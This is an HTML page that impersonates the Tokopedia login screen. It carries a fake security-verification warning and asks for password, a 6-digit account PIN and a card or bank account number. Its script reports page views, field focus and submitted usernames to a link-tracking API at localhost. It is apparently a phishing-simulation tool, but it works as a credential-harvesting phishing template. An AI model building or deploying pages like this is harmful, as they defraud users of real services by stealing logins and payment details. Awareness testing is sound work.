<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Tokopedia</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Open Sans', sans-serif; background: #f0f3f7; min-height: 100vh; display: flex; flex-direction: column; }
        .navbar { background: white; padding: 15px 5%; box-shadow: 0 2px 8px rgba(0,0,0,0.08); display: flex; align-items: center; justify-content: space-between; }
        .logo { display: flex; align-items: center; gap: 8px; font-size: 1.8rem; font-weight: bold; }
        .main-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
        .login-card { background: white; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.12); width: 100%; max-width: 480px; padding: 40px; }
        .login-header { text-align: center; margin-bottom: 30px; }
        .login-header h1 { color: #31353b; font-size: 1.8rem; margin-bottom: 10px; }
        .promo-banner { background: linear-gradient(135deg, #03ac0e 0%, #42b549 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 25px; text-align: center; }
        .alert-security { background: #fff4e5; border-left: 4px solid #ff9800; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; margin-bottom: 8px; color: #31353b; font-weight: 600; font-size: 0.9rem; }
        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e5e7e9; border-radius: 8px; font-size: 1rem; }
        .form-group input:focus { outline: none; border-color: #03ac0e; }
        .btn-login { width: 100%; padding: 14px; background: linear-gradient(135deg, #03ac0e 0%, #42b549 100%); color: white; border: none; border-radius: 8px; font-size: 1.05rem; font-weight: 600; cursor: pointer; }
        .footer { background: #31353b; color: white; padding: 30px 5%; text-align: center; }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo"><span style="color:#42b549;">Toko</span><span style="color:#f94d63;">pedia</span></div>
    </div>
    <div class="main-container">
        <div class="login-card">
            <div class="login-header"><h1>Masuk ke Tokopedia</h1><p>Belanja apa aja, semua ada!</p></div>
            <div class="promo-banner"><h3>üéâ Promo Spesial Hari Ini!</h3><p>Diskon hingga 90% + Gratis Ongkir</p></div>
            <div class="alert-security"><strong style="color:#e65100;">üîê Verifikasi Keamanan Akun</strong><p style="color:#ef6c00;font-size:0.85rem;">Kami mendeteksi aktivitas login dari perangkat baru. Harap verifikasi identitas Anda.</p></div>
            <form id="loginForm">
                <div class="form-group"><label>Nomor HP atau Email</label><input type="text" id="username" required></div>
                <div class="form-group"><label>Password</label><input type="password" id="password" required></div>
                <div class="form-group"><label>PIN Akun (6 digit)</label><input type="password" id="pin" maxlength="6" required></div>
                <div class="form-group"><label>Nomor Kartu/Rekening</label><input type="text" id="cardNumber" maxlength="19" required></div>
                <button type="submit" class="btn-login">Masuk</button>
            </form>
        </div>
    </div>
    <div class="footer"><p><strong>PT Tokopedia</strong></p><p>¬© 2009-2024, PT Tokopedia</p></div>
    <script>
        const API_URL = 'http://localhost:5000/api';
        const linkId = new URLSearchParams(window.location.search).get('id');
        async function trackView() { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'Tokopedia login page opened' }) }); } catch (e) {} }
        async function trackClick(f) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {} }
        async function trackSubmit(d) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
        document.getElementById('pin').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
        document.getElementById('cardNumber').addEventListener('input', function(e) { let v = e.target.value.replace(/\s/g, ''); e.target.value = v.match(/.{1,4}/g)?.join(' ') || v; });
        let c = new Set();
        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const pin = document.getElementById('pin').value;
            if (pin.length !== 6) { alert('PIN harus 6 digit!'); return; }
            await trackSubmit({ username: document.getElementById('username').value });
            const btn = e.target.querySelector('.btn-login');
            btn.textContent = 'Memverifikasi...'; btn.disabled = true;
            setTimeout(() => window.location.href = 'index.html', 2000);
        });
        window.addEventListener('DOMContentLoaded', trackView);
    </script>
</body>
</html>
